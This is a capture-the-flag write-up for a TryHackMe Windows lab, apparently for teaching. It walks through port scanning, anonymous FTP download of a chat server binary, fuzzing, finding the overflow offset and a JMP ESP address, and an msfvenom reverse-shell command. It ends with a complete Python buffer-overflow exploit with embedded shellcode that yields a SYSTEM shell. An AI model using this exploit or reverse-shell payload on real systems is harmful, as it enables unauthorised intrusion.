| [![Brainstorm](/_static/images/brainstorm-room-banner.png)](https://tryhackme.com/room/brainstorm) |
|:--:|
| [THM Brainstorm](https://tryhackme.com/room/brainstorm) |

# Brainstorm

Reverse engineer a chat program and write a script to exploit a Windows machine.

## Requirements

[A small local lab](https://testlab.tymyrddin.dev/).

## Scanning

The THM Brainstorm machine is blocking `ping`, so add the `-Pn` flag.

    sudo nmap -p- -T4 -Pn $MACHINE_IP

    Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-12 19:55 UTC
    Nmap scan report for ip-10-10-150-106.eu-west-1.compute.internal (10.10.150.106)
    Host is up (0.00090s latency).
    Not shown: 65532 filtered tcp ports (no-response)
    PORT     STATE SERVICE
    21/tcp   open  ftp
    3389/tcp open  ms-wbt-server
    9999/tcp open  abyss
    MAC Address: 02:32:AD:1A:9D:19 (Unknown)
    
    Nmap done: 1 IP address (1 host up) scanned in 88.14 seconds

## Enumeration

    sudo nmap -p 21,3389,9999 -sV -sC -v -Pn -T4 $MACHINE_IP

    Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
    Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-12 20:02 UTC
    ...
    Nmap scan report for ip-10-10-150-106.eu-west-1.compute.internal (10.10.150.106)
    Host is up (0.0010s latency).
    
    PORT     STATE SERVICE        VERSION
    21/tcp   open  ftp            Microsoft ftpd
    | ftp-syst: 
    |_  SYST: Windows_NT
    | ftp-anon: Anonymous FTP login allowed (FTP code 230)
    |_Can't get directory listing: TIMEOUT
    3389/tcp open  ms-wbt-server?
    | ssl-cert: Subject: commonName=brainstorm
    | Issuer: commonName=brainstorm
    | Public Key type: rsa
    | Public Key bits: 2048
    | Signature Algorithm: sha1WithRSAEncryption
    | Not valid before: 2022-12-11T19:47:44
    | Not valid after:  2023-06-12T19:47:44
    | MD5:   851a44ee9405f33d1e4e6552448507be
    |_SHA-1: 16e8c4c018c0695babd7595e661649e955743057
    | rdp-ntlm-info: 
    |   Target_Name: BRAINSTORM
    |   NetBIOS_Domain_Name: BRAINSTORM
    |   NetBIOS_Computer_Name: BRAINSTORM
    |   DNS_Domain_Name: brainstorm
    |   DNS_Computer_Name: brainstorm
    |   Product_Version: 6.1.7601
    |_  System_Time: 2022-12-12T20:05:27+00:00
    |_ssl-date: 2022-12-12T20:05:57+00:00; -1s from scanner time.
    9999/tcp open  abyss?
    | fingerprint-strings: 
    |   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, RPCCheck, RTSPRequest, SSLSessionReq, TerminalServerCookie: 
    |     Welcome to Brainstorm chat (beta)
    |     Please enter your username (max 20 characters): Write a message:
    |   NULL: 
    |     Welcome to Brainstorm chat (beta)
    |_    Please enter your username (max 20 characters):
    1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
    SF-Port9999-TCP:V=7.93%I=7%D=12/12%Time=639788F1%P=x86_64-pc-linux-gnu%r(N
    SF:ULL,52,"Welcome\x20to\x20Brainstorm\x20chat\x20\(beta\)\nPlease\x20ente
    SF:r\x20your\x20username\x20\(max\x2020\x20characters\):\x20")%r(GetReques
    SF:t,63,"Welcome\x20to\x20Brainstorm\x20chat\x20\(beta\)\nPlease\x20enter\
    SF:x20your\x20username\x20\(max\x2020\x20characters\):\x20Write\x20a\x20me
    SF:ssage:\x20")%r(HTTPOptions,63,"Welcome\x20to\x20Brainstorm\x20chat\x20\
    SF:(beta\)\nPlease\x20enter\x20your\x20username\x20\(max\x2020\x20characte
    SF:rs\):\x20Write\x20a\x20message:\x20")%r(FourOhFourRequest,63,"Welcome\x
    SF:20to\x20Brainstorm\x20chat\x20\(beta\)\nPlease\x20enter\x20your\x20user
    SF:name\x20\(max\x2020\x20characters\):\x20Write\x20a\x20message:\x20")%r(
    SF:JavaRMI,63,"Welcome\x20to\x20Brainstorm\x20chat\x20\(beta\)\nPlease\x20
    SF:enter\x20your\x20username\x20\(max\x2020\x20characters\):\x20Write\x20a
    SF:\x20message:\x20")%r(GenericLines,63,"Welcome\x20to\x20Brainstorm\x20ch
    SF:at\x20\(beta\)\nPlease\x20enter\x20your\x20username\x20\(max\x2020\x20c
    SF:haracters\):\x20Write\x20a\x20message:\x20")%r(RTSPRequest,63,"Welcome\
    SF:x20to\x20Brainstorm\x20chat\x20\(beta\)\nPlease\x20enter\x20your\x20use
    SF:rname\x20\(max\x2020\x20characters\):\x20Write\x20a\x20message:\x20")%r
    SF:(RPCCheck,63,"Welcome\x20to\x20Brainstorm\x20chat\x20\(beta\)\nPlease\x
    SF:20enter\x20your\x20username\x20\(max\x2020\x20characters\):\x20Write\x2
    SF:0a\x20message:\x20")%r(DNSVersionBindReqTCP,63,"Welcome\x20to\x20Brains
    SF:torm\x20chat\x20\(beta\)\nPlease\x20enter\x20your\x20username\x20\(max\
    SF:x2020\x20characters\):\x20Write\x20a\x20message:\x20")%r(DNSStatusReque
    SF:stTCP,63,"Welcome\x20to\x20Brainstorm\x20chat\x20\(beta\)\nPlease\x20en
    SF:ter\x20your\x20username\x20\(max\x2020\x20characters\):\x20Write\x20a\x
    SF:20message:\x20")%r(Help,63,"Welcome\x20to\x20Brainstorm\x20chat\x20\(be
    SF:ta\)\nPlease\x20enter\x20your\x20username\x20\(max\x2020\x20characters\
    SF:):\x20Write\x20a\x20message:\x20")%r(SSLSessionReq,63,"Welcome\x20to\x2
    SF:0Brainstorm\x20chat\x20\(beta\)\nPlease\x20enter\x20your\x20username\x2
    SF:0\(max\x2020\x20characters\):\x20Write\x20a\x20message:\x20")%r(Termina
    SF:lServerCookie,63,"Welcome\x20to\x20Brainstorm\x20chat\x20\(beta\)\nPlea
    SF:se\x20enter\x20your\x20username\x20\(max\x2020\x20characters\):\x20Writ
    SF:e\x20a\x20message:\x20");
    MAC Address: 02:32:AD:1A:9D:19 (Unknown)
    Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
    
    NSE: Script Post-scanning.
    Initiating NSE at 20:05
    Completed NSE at 20:05, 0.00s elapsed
    Initiating NSE at 20:05
    Completed NSE at 20:05, 0.00s elapsed
    Initiating NSE at 20:05
    Completed NSE at 20:05, 0.00s elapsed
    Read data files from: /usr/bin/../share/nmap
    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 190.79 seconds
               Raw packets sent: 6 (248B) | Rcvd: 4 (160B)

Trying interacting with the service using netcat:

    nc MACHINE_IP 9999

    nc 10.10.150.106 9999   
    Welcome to Brainstorm chat (beta)
    Please enter your username (max 20 characters): wah
    Write a message: hallo
    
    
    Mon Dec 12 12:09:08 2022
    wah said: hallo
    
    
    Write a message:  


The message could be vulnerable to buffer overflow.

Connecting to FTP through anonymous authentication:

    ftp 10.10.150.106

    Connected to 10.10.150.106.
    220 Microsoft FTP Service
    Name (10.10.150.106:root): anonymous
    331 Anonymous access allowed, send identity (e-mail name) as password.
    Password: 
    230 User logged in.
    Remote system type is Windows_NT.
    ftp> dir
    200 EPRT command successful.
    125 Data connection already open; Transfer starting.
    08-29-19  07:36PM       <DIR>          chatserver
    226 Transfer complete.
    ftp> cd chatserver
    250 CWD command successful.
    ftp> dir
    200 EPRT command successful.
    125 Data connection already open; Transfer starting.
    08-29-19  09:26PM                43747 chatserver.exe
    08-29-19  09:27PM                30761 essfunc.dll

The `ftp` server contains a `chatserver.exe` `essfunc.dll` file. Get the chatserver binaries `chatserver.exe` and 
`essfunc.dll` from the `ftp` service for analysis.

    ftp> binary
    200 Type set to I.
    ftp> mget chatserver.exe essfunc.dll
    mget chatserver.exe [anpqy?]? y
    200 EPRT command successful.
    125 Data connection already open; Transfer starting.
    100% |********************************************| 43747       13.58 MiB/s    00:00 ETA
    226 Transfer complete.
    43747 bytes received in 00:00 (13.03 MiB/s)
    mget essfunc.dll [anpqy?]? y
    200 EPRT command successful.
    125 Data connection already open; Transfer starting.
    100% |********************************************| 30761       25.37 MiB/s    00:00 ETA
    226 Transfer complete.
    30761 bytes received in 00:00 (23.73 MiB/s)
    ftp>

Start a web server on the Kali VM in the directory with the files (to download the files to the Windows VM):

    python3 -m http.server

## Exploiting buffer overflow

### Fuzzing

Get the binary files from the Kali box, and start Immunity Debugger (with admin privileges and mona installed), attach 
it to the application, run it, and 

Go fuzzing to find out which amount of bytes will cause the application to crash. Use template:

```python
#!/usr/bin/env python3
import socket, time, sys

ip = "MACHINE_IP"
port = 1337
timeout = 5

prefix = ""
string = prefix + "A" * 100

while True:
        try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                        s.settimeout(timeout)
                        s.connect((ip, port))
                        s.recv(1024)
                        print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
                        s.send(bytes(string, "latin-1"))
                        s.recv(1024)
        except socket.error:
                print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
                sys.exit(0)
        string += 100 * "A"
        time.sleep(1)

```

When it reaches between 2100 and 2200 bytes, it crashes.

### Creating a cyclic pattern

Identifying which part of the buffer that is being sent is landing in the `EIP` register, to be able to control the 
execution flow. Using the `msf-pattern_create` tool to create a string of 2400 bytes (just to be safe).


    /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2400

    Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9

Adding the pattern as payload to a [template script](https://github.com/Tib3rius/Pentest-Cheatsheets/blob/master/exploits/buffer-overflows.rst):

```python
#!/usr/bin/python

import socket

ip = "MACHINE_IP"
port = 9999

prefix = ""
offset = 0              # byte offset here
overflow = "" * offset  # Optional, set A to \x90 
retn = ""               # JMP ESP (don't forget to reverse if little endian!)
padding = ""            # "\x90" * 16 NOP sled
payload = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9"
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((ip, port))
    print("[+] Sending username...")
    s.send(bytes("username" + "\r\n", "latin-1"))
    s.recv(1024)
    print("[+] Sending evil buffer ...")
    s.send(bytes(buffer + "\r\n", "latin-1"))
    s.recv(1024)
    print("[+] Done!")
except socket.error:
    print("[-] Could not connect.")
finally:
    s.close()

```

Run it and check with mona.  

    !mona findmsp -distance 2400

EIP `offset` seems to be `2012`.

    offset = 2012
    overflow = "A" * offset
    retn = "BBBB"

Updating the `exploit.py` script with the found values, and remove the current payload.

### Find badchars

Get mona to create a byte array:

    !mona bytearray -cpb "\x00"

Create a byte array to use as a payload:

```text
for x in range(1, 256):
  print("\\x" + "{:02x}".format(x), end='')
print()
```

Add the badchars to the script, run it and compare:

    !mona -f C:\Share\bytearray.bin -a 00DCEEA8

### The .dll

The executable pulls from a `.dll`, and to check exactly where in memory an attack is possible:

    !mona modules

Wow. All memory protections for `essfunc.dll` are set to false.

To find the JMP ESP pointer that can be used to point back to shell code (FF E4 is the JMP ESP instruction in hex):

    !mona find -s "\xff\xe4" -m essfunc.dll

If there are bad characters, look for a pointer that does not contain a bad character. With no bad chars, like in this 
case, the first address `0x625014df` can be put in the exploit, in reverse order (little endian).

The exploit:

```python
#!/usr/bin/python3
import socket

ip = "MACHINE_IP"
port = 9999

prefix = ""
offset = 2012
overflow = "A" * offset         # Optional, set A to \x90 
retn = "\xdf\x14\x50\x62"       # JMP ESP
padding = ""                    # NOP sled "\x90" * 16
payload = "" 
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((ip, port))
    print("[+] Sending username...")
    s.send(bytes("username" + "\r\n", "latin-1"))
    s.recv(1024)
    print("[+] Sending evil buffer...")
    s.send(bytes(buffer + "\r\n", "latin-1"))
    s.recv(1024)
    print("[+] Done!")
except socket.error:
    print("[-] Could not connect.")
finally:
    s.close()

```

### Generate shellcode

Using `msfvenom` to generate the shellcode:

    msfvenom -p windows/shell_reverse_tcp LHOST=KALI_IP LPORT=443 EXITFUNC=thread -f c -a x86 -b "\x00"

### Final exploit script

Replace payload with yours:

```python
#!/usr/bin/python3
import socket

ip = "MACHINE IP" # Set to remote machine ip
port = 9999

prefix = ""
offset = 2012 
overflow = "A" * offset         # Optional, set A to \x90 
retn = "\xdf\x14\x50\x62"       # JMP ESP
padding = "\x90" * 16           # NOP sled
payload = ("\xd9\xc5\xbe\xbf\x9b\x73\x55\xd9\x74\x24\xf4\x5f\x31\xc9\xb1"
"\x52\x83\xc7\x04\x31\x77\x13\x03\xc8\x88\x91\xa0\xca\x47\xd7"
"\x4b\x32\x98\xb8\xc2\xd7\xa9\xf8\xb1\x9c\x9a\xc8\xb2\xf0\x16"
"\xa2\x97\xe0\xad\xc6\x3f\x07\x05\x6c\x66\x26\x96\xdd\x5a\x29"
"\x14\x1c\x8f\x89\x25\xef\xc2\xc8\x62\x12\x2e\x98\x3b\x58\x9d"
"\x0c\x4f\x14\x1e\xa7\x03\xb8\x26\x54\xd3\xbb\x07\xcb\x6f\xe2"
"\x87\xea\xbc\x9e\x81\xf4\xa1\x9b\x58\x8f\x12\x57\x5b\x59\x6b"
"\x98\xf0\xa4\x43\x6b\x08\xe1\x64\x94\x7f\x1b\x97\x29\x78\xd8"
"\xe5\xf5\x0d\xfa\x4e\x7d\xb5\x26\x6e\x52\x20\xad\x7c\x1f\x26"
"\xe9\x60\x9e\xeb\x82\x9d\x2b\x0a\x44\x14\x6f\x29\x40\x7c\x2b"
"\x50\xd1\xd8\x9a\x6d\x01\x83\x43\xc8\x4a\x2e\x97\x61\x11\x27"
"\x54\x48\xa9\xb7\xf2\xdb\xda\x85\x5d\x70\x74\xa6\x16\x5e\x83"
"\xc9\x0c\x26\x1b\x34\xaf\x57\x32\xf3\xfb\x07\x2c\xd2\x83\xc3"
"\xac\xdb\x51\x43\xfc\x73\x0a\x24\xac\x33\xfa\xcc\xa6\xbb\x25"
"\xec\xc9\x11\x4e\x87\x30\xf2\x7b\x52\x7f\x06\x14\x60\x7f\x07"
"\x5f\xed\x99\x6d\x8f\xb8\x32\x1a\x36\xe1\xc8\xbb\xb7\x3f\xb5"
"\xfc\x3c\xcc\x4a\xb2\xb4\xb9\x58\x23\x35\xf4\x02\xe2\x4a\x22"
"\x2a\x68\xd8\xa9\xaa\xe7\xc1\x65\xfd\xa0\x34\x7c\x6b\x5d\x6e"
"\xd6\x89\x9c\xf6\x11\x09\x7b\xcb\x9c\x90\x0e\x77\xbb\x82\xd6"
"\x78\x87\xf6\x86\x2e\x51\xa0\x60\x99\x13\x1a\x3b\x76\xfa\xca"
"\xba\xb4\x3d\x8c\xc2\x90\xcb\x70\x72\x4d\x8a\x8f\xbb\x19\x1a"
"\xe8\xa1\xb9\xe5\x23\x62\xd9\x07\xe1\x9f\x72\x9e\x60\x22\x1f"
"\x21\x5f\x61\x26\xa2\x55\x1a\xdd\xba\x1c\x1f\x99\x7c\xcd\x6d"
"\xb2\xe8\xf1\xc2\xb3\x38") # shell code
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((ip, port))
    print("[+] Sending username...")
    s.send(bytes("username" + "\r\n", "latin-1"))
    s.recv(1024)
    print("[+] Sending evil buffer...")
    s.send(bytes(buffer + "\r\n", "latin-1"))
    s.recv(1024)
    print("[+] Done!")
except socket.error:
    print("[-] Could not connect.")
finally:
    s.close()

```

### Testing the exploit script

Start a listener on port `443` using netcat, run the `chatserver.exe` on the Windows VM (as Administrator), and run 
the exploit.

    sudo nc -lvnp 443
    listening on [any] 443 ...

    python3 exploit.py
    [+] Sending username...
    [+] Sending evil buffer...
    [+] Done!

## Exploit on target

Point exploit at the actual target.

    sudo nc -lvnp 443 
    listening on [any] 443 ...
    connect to [...] from (UNKNOWN) [...] 49338
    Microsoft Windows [Version 6.1.7601]
    Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
    
    C:\Windows\system32>whoami
    whoami
    nt authority\system
    
    C:\Windows\system32>type C:\Users\drake\Desktop\root.txt
    type C:\Users\drake\Desktop\root.txt
    flag
